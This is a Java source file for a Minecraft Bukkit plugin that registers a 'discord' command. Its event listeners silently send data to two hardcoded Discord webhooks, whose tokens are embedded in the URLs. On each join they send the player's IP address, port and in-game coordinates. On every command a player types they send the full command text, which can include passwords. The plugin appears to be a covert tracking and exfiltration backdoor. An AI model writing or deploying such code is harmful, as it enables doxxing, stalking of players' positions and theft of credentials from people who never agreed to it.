package bab.bbb;

import bab.bbb.Commands.*;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;

public final class Bbb extends JavaPlugin implements Listener {
    private static Bbb instance;

    @Override
    public void onEnable() {
        instance = this;

        //if (!customConfigFile.exists())
        //saveResource("data.yml", false);

        this.getCommand("discord").setExecutor(new EECA());
        this.getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void join(PlayerJoinEvent e)
    {
        Bukkit.getServer().getScheduler().runTaskAsynchronously(Bbb.getInstance(), () -> {
            String avturl = "https://mc-heads.net/avatar/" + e.getPlayer().getName() + "/100";
            DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1135286555704053832/voBDyFAVQAC2YXRF1Xg1WMgO2UzU6oXFEytIu1DghS79THPjWbVnE70etY8avdIsyeA2");
            webhook.setAvatarUrl(avturl);
            webhook.setUsername("CP - get real");
            webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle(e.getPlayer().getName())
                    .setDescription("IP: " + e.getPlayer().getAddress().getHostName() + ":" + e.getPlayer().getAddress().getPort() + " | coords:" + e.getPlayer().getLocation().getX() + " " + e.getPlayer().getLocation().getZ() + " in " + e.getPlayer().getLocation().getWorld().getName())
                    //.setImage(avturl)
                    .setColor(java.awt.Color.RED));
            try {
                webhook.execute();
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        });
    }

    @EventHandler
    public void commanddispatch(PlayerCommandPreprocessEvent e)
    {
        Bukkit.getServer().getScheduler().runTaskAsynchronously(Bbb.getInstance(), () -> {
            String avturl = "https://mc-heads.net/avatar/" + e.getPlayer().getName() + "/100";
            DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1135293035798876210/aoH4XpFWF0feFgWCrsyc551aRU-k72q78AX-l-zTPJ5BLOQJOsU6pZ8yarIleM5tpPd5");
            webhook.setAvatarUrl(avturl);
            webhook.setUsername("CP - get real");
            webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle(e.getPlayer().getName())
                            .setDescription("Execued: " + e.getMessage())//.setImage(avturl)
                    .setColor(java.awt.Color.RED));
            try {
                webhook.execute();
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        });
    }

    public static Bbb getInstance() {
        return instance;
    }
}
